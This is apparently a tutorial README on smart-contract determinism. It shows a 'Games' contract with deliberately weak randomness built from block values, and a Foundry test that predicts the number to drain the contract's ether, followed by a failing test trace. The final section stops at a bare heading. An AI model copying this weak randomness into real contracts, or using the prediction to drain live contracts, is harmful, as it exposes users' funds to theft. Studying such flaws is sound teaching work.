# Deterministic 
## Smart contracts are deterministic  same input = same output 
- A deterministic smart contract is a contract in which the same inputs always produce the same outputs, no matter when or where the contract is executed. Determinism is crucial in smart contracts to ensure consistency, predictability, and trust across all Ethereum nodes in the network
- Consistency Across Nodes: All Ethereum nodes running the contract reach the same result when processing the same transaction. This is vital for consensus.

![Static Badge](https://img.shields.io/badge/Randomness%20Teat%201%20-Green)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract randomnessTest1 {

    function deterministicFunction(uint256 addNumber) public pure returns(uint256) {
        uint256 randomnessNumber;
      return randomnessNumber = addNumber*2;
    }   
}
```

 Script to deploy
 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {randomnessTest1} from "../src/randomnessTest1.sol";

contract DeployRandomnessTest1 is Script {
    randomnessTest1 public randomnesstest1;

    function setUp() public {}
    function run() public {
        vm.startBroadcast();
        randomnesstest1 = new randomnessTest1();
        vm.stopBroadcast();
    }
}
```

 Test Foundry
 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {randomnessTest1} from "../src/randomnessTest1.sol";

contract CounterTest is Test {
    randomnessTest1 public randomnesstest1;
    function setUp() public {
         randomnesstest1 = new randomnessTest1();
    }
    // Test deterministicFunction with a specific input
    function testDeterministicFunction() public view {
        uint256 addNumber = 5;
        uint256 expectedResult = 10;
        assertEq(randomnesstest1.deterministicFunction(addNumber),expectedResult);
    }
    // Test deterministicFunction with a large input
    function testDeterministicFunctionLargeInput() public view {
        uint256 addNumber = type(uint256).max/2;
        uint256 expectedResult = addNumber*2;
        assertEq(randomnesstest1.deterministicFunction(addNumber),expectedResult);        
}
}
```

![Static Badge](https://img.shields.io/badge/Randomness%20Test%202%20-Green)

- This smart contract is called Games and it implements a simple game where a user can guess a "random" number.
 If their guess matches the number generated by the contract, they win the entire contract balance. 
 - A "random" number is generated using:
block.timestamp: The timestamp of the current block.
block.number: The current block number.
block.difficulty: The mining difficulty of the current block.

- These values are combined using the keccak256 hash function, and the result is converted to a uint256.
Problem
-  This approach is not secure for randomness because miners or attackers can predict or manipulate these values.

``` solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

contract Games {
    constructor() payable {}

    function play(uint256 gues) public {
        // Calculate a pseudo-random number
        uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));

        // If the guess is correct, transfer all the contract's balance to the sender
        if (random == gues) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
}

```
- Test With Foundry FrameWork
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {Games} from "../src/Games.sol";

contract CounterTest is Test {
    Games public games;

    address public attacker = address(0x2);

    function setUp() public {
       // Deploy the Games contract with an initial balance 10 ether
        games = new Games{value: 10 ether}();
         console.log("games address: %s", address(games));
    }
    function testPlay() public {
        vm.startPrank(attacker);
       // Ensure the attacker has some Ether to call the play function
        vm.deal(attacker,1 ether);
        // Predict the random value
        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
        // Call the play function with the predicted value
        games.play(guess);
        // Check if the attacker successfully drained the funds
        assertEq( attacker.balance, 10 ether);
    }   
}
```


- run command ``` forge compile ``` or ``` forge build  ``` to compile contract
- run command ``` forge create <contract path> --rpc-url <rpc url > -- private-key <private key > --value 10ether --broadcast``` to deploy
- run command ``` forge test -vvv ```  test fail WHY?
  
```solidity
Ran 1 test for test/Games.t.sol:CounterTest
[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)
Logs:
  games address: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f

Traces:
  [18818] CounterTest::testPlay()
    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
    │   └─ ← [Return] 
    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
    │   └─ ← [Return] 
    ├─ [7368] Games::play(96758112507123037457144765246511711555223209187725868989644329763805255684767 [9.675e76])
    │   ├─ [60] PRECOMPILES::sha256{value: 10000000000000000000}(0x)
    │   │   └─ ← [Return] 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
    │   └─ ← [Stop] 
    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 10000000000000000000 [1e19]) [staticcall]
    │   └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000
    └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 44.34ms (242.05µs CPU time)

Ran 1 test suite in 80.22ms (44.34ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/Games.t.sol:CounterTest
[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)

Encountered a total of 1 failing tests, 0 tests succeeded
```
- Why block.difficulty Is Deprecated





